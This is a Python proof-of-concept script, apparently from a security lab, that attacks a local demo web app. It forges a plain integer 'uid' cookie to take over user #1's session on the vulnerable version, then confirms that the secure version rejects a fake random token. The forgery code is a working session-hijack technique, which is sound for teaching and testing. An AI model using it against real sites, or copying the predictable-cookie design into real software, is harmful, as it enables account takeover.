"""
PoC 5.5 - Insecure session cookie
==================================
v1 sets a session cookie named 'uid' whose value is the integer user id.
Any request with uid=1 is treated as user #1 - no secret required.
v2 uses a 32-byte random token validated server-side; forging it is infeasible.

Requirements: v1 on http://127.0.0.1:5000, v2 on http://127.0.0.1:5001
Note: register 'analyst@authx.internal' / 'analyst' on v1 before running.
"""

import requests

V1 = "http://127.0.0.1:5000"
V2 = "http://127.0.0.1:5001"
EMAIL = "analyst@authx.internal"
PASSWORD = "analyst"


def login(base, email, password):
    session = requests.Session()
    session.post(
        f"{base}/login",
        data={"email": email, "password": password},
        allow_redirects=False,
    )
    return session


def forge_uid_cookie(base, user_id):
    """Attempt to access the dashboard using a manually crafted uid cookie."""
    session = requests.Session()
    session.cookies.set("uid", str(user_id))
    r = session.get(f"{base}/dashboard", allow_redirects=False)
    return r


def forge_token_cookie(base, fake_token):
    """Attempt to access the dashboard using a fake session_token cookie."""
    session = requests.Session()
    session.cookies.set("session_token", fake_token)
    r = session.get(f"{base}/dashboard", allow_redirects=False)
    return r


def separator(title):
    print(f"\n{'='*60}")
    print(f"  {title}")
    print('='*60)


def main():
    # ── v1: attack ──────────────────────────────────────────────
    separator("v1-vulnerable - attack")

    print(f"[*] Logging in as {EMAIL!r} to observe the cookie...")
    sess = login(V1, EMAIL, PASSWORD)
    cookie_val = sess.cookies.get("uid")
    print(f"    Cookie received: uid={cookie_val!r}")
    print("    Value is the plain integer user id - predictable and forgeable.")

    print()
    print("[*] Forging a session for user id=1 without knowing their password...")
    r = forge_uid_cookie(V1, 1)
    print(f"    HTTP {r.status_code}")
    if r.status_code == 200:
        print("    [!] Dashboard returned for user id=1 with a forged cookie.")
    else:
        print(f"    Redirected ({r.headers.get('Location', '?')}) - user may not exist.")

    # ── v2: re-test ──────────────────────────────────────────────
    separator("v2-secure - re-test")

    print("[*] Forging session_token='fake-token-123' on v2...")
    r2 = forge_token_cookie(V2, "fake-token-123")
    print(f"    HTTP {r2.status_code}")
    if r2.status_code == 302:
        print("    [+] Fake token rejected - redirected to login.")
    else:
        print(f"    Unexpected response ({r2.status_code}).")


if __name__ == "__main__":
    main()
